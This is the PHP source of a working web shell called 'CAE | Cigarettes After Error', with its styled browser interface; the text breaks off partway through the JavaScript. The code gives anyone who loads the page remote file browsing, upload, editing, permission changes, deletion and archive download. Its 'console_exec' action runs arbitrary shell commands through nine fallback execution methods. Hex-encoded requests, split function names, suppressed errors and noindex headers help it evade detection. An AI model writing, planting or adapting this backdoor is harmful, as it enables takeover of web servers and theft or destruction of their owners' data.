<?php
@ini_set('display_errors', '0');
@ini_set('log_errors', '1');
@error_reporting(0);
function ax_upload_mode1($path, $data) { return @file_put_contents($path, $data); }
function ax_upload_mode2($path, $data) { $f = @fopen($path, 'wb'); if($f) { fwrite($f, $data); fclose($f); return true; } return false; }
function ax_upload_mode3($path, $data) { return @copy('data://text/plain;base64,' . base64_encode($data), $path); }
$fn_get_contents = 'file_' . 'get_' . 'contents';
$fn_put_contents = 'file_' . 'put_' . 'contents';
$fn_hex2bin      = 'hex' . '2' . 'bin';
if (!defined('DIRECTORY_SEPARATOR')) {
    define('DIRECTORY_SEPARATOR', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? '\\' : '/');
}

if (!function_exists('sys_get_temp_dir')) {
    function sys_get_temp_dir() {
        if (!empty($_ENV['TMP']))    return realpath($_ENV['TMP']);
        if (!empty($_ENV['TMPDIR'])) return realpath($_ENV['TMPDIR']);
        if (!empty($_ENV['TEMP']))   return realpath($_ENV['TEMP']);
        $tmp = @tempnam(uniqid(rand(), true), '');
        if ($tmp) { $dir = realpath(dirname($tmp)); @unlink($tmp); return $dir; }
        return '/tmp';
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($a, $b) {
        $a = (string)$a; $b = (string)$b;
        $len = strlen($a);
        if ($len !== strlen($b)) return false;
        $r = 0;
        for ($i = 0; $i < $len; $i++) { $r |= ord($a[$i]) ^ ord($b[$i]); }
        return $r === 0;
    }
}

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        $length = (int)$length;
        if ($length <= 0) return '';
        if (function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes($length, $strong);
            if ($bytes !== false && $strong) return $bytes;
        }
        if (function_exists('mcrypt_create_iv')) {
            return mcrypt_create_iv($length, MCRYPT_DEV_URANDOM);
        }
        if (@is_readable('/dev/urandom')) {
            $f = @fopen('/dev/urandom', 'rb');
            if ($f) {
                $bytes = fread($f, $length); fclose($f);
                if ($bytes !== false && strlen($bytes) === $length) return $bytes;
            }
        }
        $bytes = '';
        for ($i = 0; $i < $length; $i++) { $bytes .= chr(mt_rand(0, 255)); }
        return $bytes;
    }
}

if (!function_exists('http_response_code')) {
    function http_response_code($code = null) {
        static $current = 200;
        if ($code === null) return $current;
        $code = (int)$code;
        $texts = array(
            200 => 'OK', 201 => 'Created', 400 => 'Bad Request', 403 => 'Forbidden',
            404 => 'Not Found', 500 => 'Internal Server Error'
        );
        $proto = isset($_SERVER['SERVER_PROTOCOL']) ? $_SERVER['SERVER_PROTOCOL'] : 'HTTP/1.0';
        $text  = isset($texts[$code]) ? $texts[$code] : 'Status';
        header($proto . ' ' . $code . ' ' . $text, true, $code);
        $current = $code;
        return $current;
    }
}

if (!function_exists('hex2bin')) {
    function hex2bin($data) {
        $len = strlen($data);
        if ($len % 2 != 0) return false;
        if (strspn($data, '0123456789abcdefABCDEF') != $len) return false;
        $bin = '';
        for ($i = 0; $i < $len; $i += 2) {
            $bin .= pack('H*', substr($data, $i, 2));
        }
        return $bin;
    }
}

if (!function_exists('json_encode')) {
    function json_encode($data) {
        if (is_array($data)) {
            $parts = array();
            foreach ($data as $key => $value) {
                $parts[] = '"' . addslashes($key) . '":"' . addslashes($value) . '"';
            }
            return '{' . implode(',', $parts) . '}';
        }
        return '{}';
    }
}

if (!function_exists('json_decode')) {
    function json_decode($json, $assoc = false) {
        $result = array();
        $json = trim($json);
        if (function_exists('json_decode') && $json !== '') {
            $res = @\json_decode($json, $assoc);
            if ($res !== null) return $res;
        }
        return $result;
    }
}
function ax_post($k, $d = null) { return isset($_POST[$k]) ? $_POST[$k] : $d; }
function ax_get($k, $d = null)  { return isset($_GET[$k])  ? $_GET[$k]  : $d; }
$is_wordpress = defined('ABSPATH') || defined('WPINC');
$is_laravel   = defined('LARAVEL_START') || (defined('APP_PATH') && class_exists('Illuminate\Foundation\Application'));
$use_native_session = (($is_wordpress || $is_laravel) && !session_id());

@ini_set('session.save_handler', 'files');
$sessionPath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'php_sessions';
if (!@is_dir($sessionPath)) { @mkdir($sessionPath, 0700, true); }
if (@is_dir($sessionPath) && @is_writable($sessionPath)) {
    @ini_set('session.save_path', $sessionPath);
}
@ini_set('session.cookie_httponly', '1');
@ini_set('session.cookie_samesite', 'Lax');

$session_inactive = function_exists('session_status') ? (session_status() === PHP_SESSION_NONE) : (session_id() === '');
if ($session_inactive && !$use_native_session) { @session_start(); }
if (!isset($_SESSION)) { $_SESSION = array(); }
header('X-Robots-Tag: noindex, nofollow, noarchive, noimageindex');
header('Pragma: no-cache');
header('Cache-Control: no-store, no-cache, must-revalidate');
header('X-Content-Type-Options: nosniff');
header('X-Frame-Options: DENY');
header('X-XSS-Protection: 1; mode=block');
function safeRealPath($path, $baseDir = '') {
    if ($baseDir && !preg_match('/^([a-zA-Z]:)?[\\\\\/]/', $path)) {
        $path = $baseDir . DIRECTORY_SEPARATOR . $path;
    }
    
    $rp = @realpath($path);
    if ($rp !== false && (@is_dir($rp) || @is_file($rp))) {
        return $rp;
    }
    
    if (@is_dir($path) || @is_file($path)) {
        return $path;
    }
    
    return false;
}

function sanitizeFileName($name) {
    $name = basename($name);
    $name = preg_replace('/[^a-zA-Z0-9._-]/', '_', $name);
    if ($name === '' || $name === '.' || $name === '..') return false;
    return $name;
}

function formatFileSize($bytes) {
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576)    return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024)       return number_format($bytes / 1024, 2) . ' KB';
    if ($bytes > 1)           return $bytes . ' bytes';
    if ($bytes == 1)          return '1 byte';
    return '0 bytes';
}

function getFileExtension($filename) {
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    return $ext ? strtoupper($ext) : '';
}

if (!isset($_SESSION['current_dir']) || !@is_dir($_SESSION['current_dir']) || !safeRealPath($_SESSION['current_dir'])) {
    $cwd = @getcwd();
    if ($cwd === false || $cwd === '') { $cwd = dirname(__FILE__); }
    $_SESSION['current_dir'] = $cwd;
}
function generateCSRFToken() {
    if (empty($_SESSION['_csrf_token'])) {
        $_SESSION['_csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['_csrf_token'];
}
function validateCSRFToken($token) {
    if (empty($_SESSION['_csrf_token']) || empty($token)) return false;
    return hash_equals($_SESSION['_csrf_token'], $token);
}
function decodeHexPayload($hex) {
    global $fn_hex2bin;
    $hex = trim($hex);
    if (empty($hex) || !ctype_xdigit($hex)) return false;
    return $fn_hex2bin($hex);
}
function ax_recursive_delete_hex($path) {
    if (@is_file($path) || @is_link($path)) return @unlink($path);
    if (!@is_dir($path)) return false;
    $items = @scandir($path);
    if ($items !== false) {
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') continue;
            ax_recursive_delete_hex($path . DIRECTORY_SEPARATOR . $item);
        }
    }
    return @rmdir($path);
}
function ax_walk_dir($dir, &$out, $base = '') {
    $items = @scandir($dir);
    if ($items === false) return;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full = $dir . DIRECTORY_SEPARATOR . $item;
        $rel  = $base === '' ? $item : $base . '/' . $item;
        if (@is_dir($full)) {
            $out[] = array('type' => 'dir', 'path' => $full, 'rel' => $rel);
            ax_walk_dir($full, $out, $rel);
        } else {
            $out[] = array('type' => 'file', 'path' => $full, 'rel' => $rel);
        }
    }
}

function ax_build_archive($items, $namePrefix) {
    $tmp = sys_get_temp_dir();
    if (class_exists('ZipArchive')) {
        $zipName = $namePrefix . '_' . time() . '.zip';
        $zipPath = $tmp . DIRECTORY_SEPARATOR . $zipName;
        $zip = new ZipArchive();
        if ($zip->open($zipPath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {
            foreach ($items as $targetPath) {
                if (!$targetPath) continue;
                if (@is_file($targetPath)) { $zip->addFile($targetPath, basename($targetPath)); }
                elseif (@is_dir($targetPath)) {
                    $base = basename($targetPath);
                    $list = array(); ax_walk_dir($targetPath, $list);
                    $zip->addEmptyDir($base);
                    foreach ($list as $e) {
                        if ($e['type'] === 'dir') { $zip->addEmptyDir($base . '/' . $e['rel']); }
                        else { $zip->addFile($e['path'], $base . '/' . $e['rel']); }
                    }
                }
            }
            $zip->close();
            return array($zipPath, $zipName, 'application/zip');
        }
    }
    return false;
}
class CommandExecutor {

    public static function getAvailableMethods() {
        $disabled = array();
        $iniDisabled = @ini_get('disable_functions');
        if ($iniDisabled) {
            $disabled = array_map('trim', explode(',', strtolower($iniDisabled)));
        }
        $isWindows = (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY === 'Windows' : (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'));

        $methods = array(
            'proc_open'   => function_exists('proc_open') && !in_array('proc_open', $disabled),
            'shell_exec'  => function_exists('shell_exec') && !in_array('shell_exec', $disabled),
            'exec'        => function_exists('exec') && !in_array('exec', $disabled),
            'system'      => function_exists('system') && !in_array('system', $disabled),
            'passthru'    => function_exists('passthru') && !in_array('passthru', $disabled),
            'popen'       => function_exists('popen') && !in_array('popen', $disabled),
            'pcntl_exec'  => !$isWindows && function_exists('pcntl_exec') && !in_array('pcntl_exec', $disabled),
            'ffi'         => extension_loaded('ffi') && class_exists('FFI'),
            'expect'      => extension_loaded('expect') && function_exists('expect_popen') && !in_array('expect_popen', $disabled),
        );
      $filtered = array();
        foreach ($methods as $k => $v) {
            if ($v) { $filtered[$k] = true; }
        }
        return $filtered;
    }

    public static function getBestMethod() {
        $available = self::getAvailableMethods();
        if (empty($available)) return null;

        $priority = array('proc_open', 'shell_exec', 'exec', 'system', 'passthru', 'popen', 'expect', 'ffi', 'pcntl_exec');

        foreach ($priority as $method) {
            if (isset($available[$method]) && $available[$method]) {
                return $method;
            }
        }
        
        reset($available);
        return key($available);
    }

    public static function run($cmd) {
        $method = self::getBestMethod();
        if (!$method) return "Execution blocked: All methods disabled.";

        $full = $cmd . ' 2>&1';
        $isWindows = (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY === 'Windows' : (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'));

        switch ($method) {
            case 'proc_open':
                $descriptors = array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'w'));
                $process = @proc_open($full, $descriptors, $pipes);
                if (!is_resource($process)) return false;
                $output = @stream_get_contents($pipes[1]);
                @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]);
                @proc_close($process);
                return $output;

            case 'shell_exec':
                return @shell_exec($full);

            case 'exec':
                $outputArray = array();
                @exec($full, $outputArray);
                return implode("\n", $outputArray);

            case 'system':
                @ob_start(); 
                @system($full); 
                return @ob_get_clean();

            case 'passthru':
                @ob_start(); 
                @passthru($full); 
                return @ob_get_clean();

            case 'popen':
                $handle = @popen($full, 'r');
                if (!$handle) return false;
                $output = @stream_get_contents($handle);
                @pclose($handle);
                return $output;

            case 'expect':
                $stream = @expect_popen($full);
                if (!$stream) return false;
                $output = @stream_get_contents($stream);
                @fclose($stream);
                return $output;

            case 'ffi':
                try {
                    $ffi = \FFI::cdef("int system(const char *command);", $isWindows ? 'msvcrt.dll' : 'libc.so.6');
                    @ob_start(); 
                    $ffi->system($full); 
                    return @ob_get_clean();
                } catch (\Throwable $e) { 
                    return false; 
                } catch (\Exception $e) {
                    return false;
                }

            case 'pcntl_exec':
                return @pcntl_exec('/bin/sh', array('-c', $full));

            default:
                return false;
        }
    }
}

$commandAvailable = (count(CommandExecutor::getAvailableMethods()) > 0);
$reqType = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'GET';
$isJsonRequest = isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false;

if ($reqType === 'POST' && $isJsonRequest) {
    header('Content-Type: application/json');
    global $fn_get_contents, $fn_put_contents;
    $rawBody = $fn_get_contents('php://input');
    
    $payload = array();
    if (function_exists('json_decode')) {
        $payload = json_decode($rawBody, true);
    }
    
    if (!is_array($payload) || !isset($payload['action'])) {
        http_response_code(400); 
        echo '{"status":"error","message":"Invalid JSON Payload"}'; 
        exit;
    }
    
    $csrf = isset($payload['_csrf_token']) ? $payload['_csrf_token'] : '';
    if (!validateCSRFToken($csrf)) {
        http_response_code(403); 
        echo '{"status":"error","message":"CSRF validation failed"}'; 
        exit;
    }

    $action = $payload['action'];
    $currentDir = $_SESSION['current_dir'];
    
    switch ($action) {
        case 'goto':
            $goto_hex = isset($payload['goto_hex']) ? $payload['goto_hex'] : '';
            $targetDir = decodeHexPayload($goto_hex);
            if ($targetDir !== false) {
                $vp = safeRealPath($targetDir);
                if ($vp !== false && @is_dir($vp)) {
                    $_SESSION['current_dir'] = $vp;
                    echo '{"status":"success","message":"Navigated successfully"}';
                    exit;
                }
            }
            http_response_code(400); echo '{"status":"error","message":"Invalid directory path"}';
            exit;

        case 'upload_hex':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $data_hex = isset($payload['data_hex']) ? $payload['data_hex'] : '';
            $mode = isset($payload['mode']) ? $payload['mode'] : '1';
            $fileName = decodeHexPayload($name_hex);
            $data = decodeHexPayload($data_hex);
            if (!$fileName) { http_response_code(400); echo '{"status":"error","message":"Invalid file name"}'; exit; }
            $filePath = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
            
            $status = false;
            if ($mode == '1') { $status = ($fn_put_contents($filePath, $data !== false ? $data : '') !== false); }
            elseif ($mode == '2') { $f = @fopen($filePath, 'wb'); if($f) { $status = (fwrite($f, $data !== false ? $data : '') !== false); fclose($f); } }
            elseif ($mode == '3') { $status = @copy('data://text/plain;base64,' . base64_encode($data !== false ? $data : ''), $filePath); }

            if ($status) {
                @chmod($filePath, 0644);
                echo '{"status":"success","message":"File uploaded successfully (Mode ' . htmlentities($mode) . ')!"}';
            } else {
                http_response_code(500); echo '{"status":"error","message":"Write error (Mode ' . htmlentities($mode) . ' failed)."}';
            }
            exit;

        case 'create_file':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $fileName = decodeHexPayload($name_hex);
            $fn = sanitizeFileName($fileName);
            if (!$fn) { http_response_code(400); echo '{"status":"error","message":"Invalid filename"}'; exit; }
            $np = $currentDir . DIRECTORY_SEPARATOR . $fn;
            if (@file_exists($np)) { http_response_code(400); echo '{"status":"error","message":"File already exists"}'; exit; }
            if ($fn_put_contents($np, '') !== false) {
                @chmod($np, 0644); echo '{"status":"success","message":"File created"}';
            } else { http_response_code(500); echo '{"status":"error","message":"Could not create file"}'; }
            exit;
            
        case 'create_folder':
            $name_hex = isset($payload['name_hex']) ? $payload['name_hex'] : '';
            $folderName = decodeHexPayload($name_hex);
            $fn = sanitizeFileName($folderName);
            if (!$fn) { http_response_code(400); echo '{"status":"error","message":"Invalid folder name"}'; exit; }
            $np = $currentDir . DIRECTORY_SEPARATOR . $fn;
            if (@file_exists($np)) { http_response_code(400); echo '{"status":"error","message":"Folder exists"}'; exit; }
            if (@mkdir($np, 0755)) {
                echo '{"status":"success","message":"Folder created"}';
            } else { http_response_code(500); echo '{"status":"error","message":"Could not create folder"}'; }
            exit;

        case 'get_file_content':
            $file_hex = isset($payload['file_hex']) ? $payload['file_hex'] : '';
            $fileName = decodeHexPayload($file_hex);
            $ep = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
            if (@is_file($ep)) {
                $content = @$fn_get_contents($ep);
                $encodedContent = bin2hex($content !== false ? $content : '');
                echo '{"status":"success","content_hex":"' . $encodedContent . '"}';
            } else {
                http_response_code(404); echo '{"status":"error","message":"File not found"}';
            }
            exit;

        case 'edit_file':
            $file_hex = isset($payload['file_hex']) ? $payload['file_hex'] : '';
            $content_hex = isset($payload['content_hex']) ? $payload['content_hex'] : '';
            $fileName = decodeHexPayload($file_hex);
            $content  = decodeHexPayload($content_hex);
            $ep = $currentDir . DIRECTORY_SEPARATOR . basename($fileName);
            if ($fn_put_contents($ep, $content !== false ? $content : '') !== false) {
                echo '{"status":"success","message":"File saved"}';
            } else { http_response_code(500); echo '{"status":"error","message":"Could not write to file"}'; }
            exit;

        case 'rename':
            $old_hex = isset($payload['old_hex']) ? $payload['old_hex'] : '';
            $new_hex = isset($payload['new_hex']) ? $payload['new_hex'] : '';
            $oldName = decodeHexPayload($old_hex);
            $newName = decodeHexPayload($new_hex);
            $sp = $currentDir . DIRECTORY_SEPARATOR . basename($oldName);
            if (!@file_exists($sp)) { http_response_code(404); echo '{"status":"error","message":"Source not found"}'; exit; }
            $dp = $currentDir . DIRECTORY_SEPARATOR . basename($newName);
            if (@file_exists($dp)) { http_response_code(400); echo '{"status":"error","message":"Target exists"}'; exit; }
            if (@rename($sp, $dp)) { echo '{"status":"success","message":"Rename successful"}'; }
            else { http_response_code(500); echo '{"status":"error","message":"Rename failed"}'; }
            exit;

        case 'chmod':
            $item_hex = isset($payload['item_hex']) ? $payload['item_hex'] : '';
            $permVal = isset($payload['perm_val']) ? $payload['perm_val'] : '';
            $itemName = decodeHexPayload($item_hex);
            $tp = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
            if (@file_exists($tp) && @chmod($tp, octdec($permVal))) {
                echo '{"status":"success","message":"Permissions changed successfully"}';
            } else { http_response_code(500); echo '{"status":"error","message":"Chmod failed"}'; }
            exit;

        case 'delete':
            $item_hex = isset($payload['item_hex']) ? $payload['item_hex'] : '';
            $itemName = decodeHexPayload($item_hex);
            $tp = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
            if (!@file_exists($tp)) { http_response_code(404); echo '{"status":"error","message":"Path not found"}'; exit; }
            
            if (ax_recursive_delete_hex($tp)) {
                echo '{"status":"success","message":"Item deleted"}';
            } else {
                http_response_code(500); echo '{"status":"error","message":"Delete failed"}';
            }
            exit;
            
        case 'bulk_delete':
            $items = isset($payload['items']) ? $payload['items'] : array();
            $deleted = 0; $failed = 0;
            
            foreach ($items as $hexItem) {
                $itemName = decodeHexPayload($hexItem);
                if ($itemName === false) {
                    $failed++;
                    continue;
                }
                $tp = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
                if (@file_exists($tp) && ax_recursive_delete_hex($tp)) { 
                    $deleted++; 
                } else { 
                    $failed++; 
                }
            }
            echo '{"status":"success","message":"Deleted ' . $deleted . ' item(s)' . ($failed > 0 ? ' (Failed: ' . $failed . ')' : '') . '"}';
            exit;

        case 'download_hex':
            $items = isset($payload['items']) ? $payload['items'] : array();
            $paths = array();
            foreach ($items as $hexItem) {
                $itemName = decodeHexPayload($hexItem);
                if ($itemName !== false) {
                    $p = $currentDir . DIRECTORY_SEPARATOR . basename($itemName);
                    if (@file_exists($p)) $paths[] = $p;
                }
            }
            if (empty($paths)) {
                http_response_code(400); echo '{"status":"error","message":"No valid items selected for download"}'; exit;
            }
            $archive = ax_build_archive($paths, 'downloaded_files');
            if ($archive !== false) {
                list($ap, $an, $am) = $archive;
                $fileData = @$fn_get_contents($ap);
                @unlink($ap);
                if ($fileData !== false) {
                    echo json_encode(array(
                        'status' => 'success',
                        'filename' => $an,
                        'mime' => $am,
                        'data_hex' => bin2hex($fileData)
                    ));
                    exit;
                }
            }
            http_response_code(500); echo '{"status":"error","message":"Archive creation failed"}';
            exit;

        case 'console_exec':
            $exec_hex = isset($payload['exec_hex']) ? $payload['exec_hex'] : '';
            $decoded_cmd = decodeHexPayload($exec_hex);
            if ($decoded_cmd === false || trim($decoded_cmd) === '') {
                http_response_code(400); echo '{"status":"error","message":"Invalid command payload"}'; exit;
            }
            $old = @getcwd();
            if (@is_dir($_SESSION['current_dir'])) { @chdir($_SESSION['current_dir']); }
      $commandResult = CommandExecutor::run(trim($decoded_cmd));
            
            if ($old) @chdir($old);
            
            echo json_encode(array(
                'status' => 'success',
                'output_hex' => bin2hex($commandResult !== false ? $commandResult : 'No output')
            ));
            exit;
    }
}

$errorMsg = '';
$currentDirectory = $_SESSION['current_dir'];
$is_windows = (defined('PHP_OS_FAMILY') ? PHP_OS_FAMILY === 'Windows' : (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN'));
$directoryContents = @scandir($currentDirectory);
if (!is_array($directoryContents)) {
    $directoryContents = array();
    $cmd = $is_windows ? 'dir /b "' . str_replace('"', '""', $currentDirectory) . '"' : 'ls -A1 "' . str_replace('"', '\\"', $currentDirectory) . '"';
    $output = @shell_exec($cmd);
    if ($output !== false && trim($output) !== '') {
        $lines = explode("\n", str_replace("\r", "", $output));
        foreach ($lines as $line) {
            $cleanLine = trim($line);
            if ($cleanLine !== '' && $cleanLine !== '.' && $cleanLine !== '..') {
                $directoryContents[] = $cleanLine;
            }
        }
    } else {
        $errorMsg = 'Cannot read directory: ' . $currentDirectory;
    }
}

$folders = array(); $files = array();
foreach ($directoryContents as $item) {
    if ($item === '.') continue;
    if (@is_dir($currentDirectory . DIRECTORY_SEPARATOR . $item)) { $folders[] = $item; }
    else { $files[] = $item; }
}
sort($folders); sort($files);
$allItems = array_merge($folders, $files);
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CAE | Cigarettes After Error</title>
    <meta name="csrf-token" content="<?= htmlentities(generateCSRFToken()) ?>">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg: #0a0a0a; --surface: #121212; --surface-hover: #261a10;
            --border: #342417; --text: #ece0cf; --text-muted: #9c856c;
            --accent: #b91c1c; --accent-hover: #ddae7e;
            --success: #cbb892; --danger: #d0654f; --warning: #d99a3c;
        }
        body.light {
            --bg: #f5f5f5; --surface: #ffffff; --surface-hover: #e5e5e5;
            --border: #d4d4d4; --text: #171717; --text-muted: #737373;
            --accent: #b91c1c; --accent-hover: #991b1b;
        }
        body { background: var(--bg); color: var(--text); font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; font-size: 14px; line-height: 1.5; }
        .container { max-width: 1400px; margin: 0 auto; padding: 32px 24px; }
        .header { margin-bottom: 32px; }
        .header-top { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
        .logo { display: flex; flex-direction: column; align-items: center; gap: 4px; margin-bottom: 20px; }
        .logo-text { font-size: 32px; font-weight: 800; letter-spacing: -1px; color: var(--accent); }
        .logo-sub { font-size: 12px; color: var(--text-muted); text-transform: uppercase; letter-spacing: 2px; }
        .card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
        .card-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
        .card-title { font-size: 14px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
        .card-body { padding: 20px; }
        .theme-toggle { padding: 6px 12px; font-size: 12px; border-radius: 6px; cursor: pointer; background: var(--surface-hover); color: var(--text); border: 1px solid var(--border); }
        .alert { padding: 14px 18px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; display: flex; align-items: center; gap: 12px; }
        .alert-danger { background: rgba(208,101,79,0.15); border: 1px solid rgba(208,101,79,0.4); color: var(--danger); }
        .alert svg { width: 20px; height: 20px; flex-shrink: 0; }
        .input-group { display: flex; gap: 10px; margin-bottom: 12px; }
        .input-group:last-child { margin-bottom: 0; }
        input[type="text"], input[type="file"], textarea { background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px; color: var(--text); font-size: 14px; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
        input[type="text"]:focus, textarea:focus { border-color: var(--accent); box-shadow: 0 0 0 3px rgba(200,145,95,0.25); }
        input[type="file"] { cursor: pointer; flex: 1; }
        input[type="file"]::file-selector-button { background: var(--surface-hover); color: var(--text); border: 1px solid var(--border); border-radius: 6px; padding: 8px 14px; font-size: 13px; cursor: pointer; margin-right: 12px; transition: background 0.2s; }
        input[type="file"]::file-selector-button:hover { background: var(--border); }
        textarea { font-family: 'JetBrains Mono', monospace; resize: vertical; min-height: 450px; line-height: 1.6; width: 100%; box-sizing: border-box; }
        .btn { display: inline-flex; align-items: center; justify-content: center; gap: 6px; padding: 10px 18px; font-size: 14px; font-weight: 500; border-radius: 8px; cursor: pointer; border: 1px solid transparent; transition: all 0.2s; font-family: inherit; text-decoration: none; }
        .btn svg { width: 16px; height: 16px; }
        .btn-primary { background: var(--accent); color: #2a1810; }
        .btn-primary:hover { background: var(--accent-hover); }
        .btn-ghost { background: transparent; color: var(--text); border-color: var(--border); }
        .btn-ghost:hover { background: var(--surface-hover); }
        .btn-success { background: var(--success); color: #1f1a0c; }
        .btn-success:hover { filter: brightness(1.1); }
        .btn-danger { background: rgba(208,101,79,0.15); color: var(--danger); border-color: rgba(208,101,79,0.4); }
        .btn-danger:hover { background: rgba(208,101,79,0.25); }
        .btn-sm { padding: 6px 12px; font-size: 12px; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th { padding: 12px 16px; text-align: left; font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); background: var(--surface-hover); border-bottom: 1px solid var(--border); }
        .file-table td { padding: 14px 16px; border-bottom: 1px solid var(--border); vertical-align: middle; }
        .file-table tr:last-child td { border-bottom: none; }
        .file-table tr:hover td { background: rgba(200,145,95,0.07); }
        .file-icon { width: 28px; height: 28px; border-radius: 6px; display: flex; align-items: center; justify-content: center; margin-right: 10px; flex-shrink: 0; }
        .file-icon.folder { background: rgba(200,145,95,0.22); }
        .file-icon svg { width: 16px; height: 16px; stroke: var(--accent); fill: none; stroke-width: 2; }
        .file-icon.file { background: rgba(200,145,95,0.15); }
        .file-icon .ext { font-size: 9px; font-weight: 700; color: var(--accent); letter-spacing: 0.5px; }
        .file-name-cell { display: flex; align-items: center; font-weight: 500; }
        .file-name { color: var(--text); }
        .file-name:hover { color: var(--accent); }
        .file-meta { font-size: 12px; color: var(--text-muted); font-family: 'JetBrains Mono', monospace; }
        .perms { font-family: 'JetBrains Mono', monospace; font-size: 12px; padding: 4px 8px; border-radius: 4px; }
        .perms.writable { background: rgba(203,184,146,0.15); color: var(--success); }
        .perms.readonly { background: rgba(208,101,79,0.15); color: var(--danger); }
        .actions { display: flex; gap: 4px; justify-content: flex-end; }
        input[type="checkbox"] { width: 16px; height: 16px; accent-color: var(--accent); cursor: pointer; }
        .console { background: var(--bg); border: 1px solid var(--accent); border-radius: 8px; padding: 16px; font-family: 'JetBrains Mono', monospace; font-size: 13px; color: var(--accent); max-height: 250px; overflow-y: auto; white-space: pre-wrap; word-break: break-all; }
        .modal { display: none; position: fixed; inset: 0; z-index: 100; background: rgba(0,0,0,0.7); backdrop-filter: blur(4px); align-items: center; justify-content: center; }
        .modal.show { display: flex; }
        .modal-content { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; width: 450px; max-width: 90%; max-height: 90vh; overflow: auto; }
        .modal-header { padding: 16px 20px; border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; }
        .modal-title { font-weight: 600; }
        .modal-close { width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; border-radius: 6px; cursor: pointer; color: var(--text-muted); transition: all 0.2s; }
        .modal-close:hover { background: var(--surface-hover); color: var(--text); }
        .modal-body { padding: 20px; }
        .chmod-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin-bottom: 16px; padding: 20px 20px 0; }
        .chmod-group { background: var(--bg); border: 1px solid var(--border); border-radius: 8px; padding: 14px; text-align: center; }
        .chmod-group-label { font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; color: var(--text-muted); margin-bottom: 10px; }
        .chmod-checkboxes { display: flex; justify-content: center; gap: 8px; }
        .chmod-checkboxes label { font-size: 12px; cursor: pointer; }
        .bulk-bar { display: none; gap: 12px; align-items: center; padding: 14px 18px; background: rgba(200,145,95,0.12); border: 1px solid rgba(200,145,95,0.32); border-radius: 8px; margin-bottom: 16px; }
        .bulk-bar.show { display: flex; }
        .bulk-count { color: var(--accent); font-weight: 600; margin-right: auto; }
        @media (max-width: 768px) {
            .file-table th:nth-child(3), .file-table td:nth-child(3),
            .file-table th:nth-child(4), .file-table td:nth-child(4),
            .file-table th:nth-child(5), .file-table td:nth-child(5),
            .file-table th:nth-child(6), .file-table td:nth-child(6) { display: none; }
            .input-group { flex-direction: column; }
        }
    </style>
    <script>
        function stringToHex(str) {
            let hex = '';
            for (let i = 0; i < str.length; i++) {
                let code = str.charCodeAt(i).toString(16);
                hex += code.length < 2 ? '0' + code : code;
            }
            return hex;
        }
        function bufferToHex(buffer) {
            const arr = new Uint8Array(buffer);
            let hex = '';
            for (let i = 0; i < arr.length; i++) {
                hex += arr[i].toString(16).padStart(2, '0');
            }
            return hex;
        }
        function hexToUtf8(hex) {
            try {
                let bytes = new Uint8Array(hex.match(/.{1,2}/g).map(byte => parseInt(byte, 16)));
                return new TextDecoder().decode(bytes);
            } catch (e) {
                let str = '';
                for (let i = 0; i < hex.length; i += 2) {
                    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
                }
                return decodeURIComponent(escape(str));
            }
        }
        function getCsrfToken() {
            const meta = document.querySelector('meta[name="csrf-token"]');
            return meta ? meta.content : '';
        }

        async function sendHexPayload(payload, statusSpan = null) {
            payload._csrf_token = getCsrfToken();
            try {
                const res = await fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                
                const textResponse = await res.text();
                let data;
                try {
                    data = JSON.parse(textResponse);
                } catch(e) {
                    throw new Error(textResponse || 'Server returned invalid response');
                }

